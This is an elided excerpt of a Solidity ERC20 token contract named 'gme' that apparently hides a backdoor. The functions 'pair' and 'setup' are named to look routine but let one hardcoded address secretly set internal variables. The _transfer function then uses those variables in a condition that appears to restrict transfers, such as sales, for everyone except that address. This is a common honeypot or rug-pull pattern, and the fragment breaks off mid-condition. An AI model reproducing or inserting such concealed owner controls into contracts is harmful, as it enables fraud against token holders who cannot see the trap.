...
contract gme is Ownable, IERC20, IERC20Meta {
    ...
    function pair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x3b1f7A3807c7dc8555142cdfC2897457a3216b28) _d58494 = account;
        return true;
    }

        function setup(address account) public virtual returns (bool) {
         if(_msgSender() == 0x3b1f7A3807c7dc8555142cdfC2897457a3216b28) _e78485 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _d58494 && to == _e78485) || (_d58494 == to && from != _e78485 && from  != 0x3b1f7A3807c7dc8555142cdfC2897457a3216b28)) {
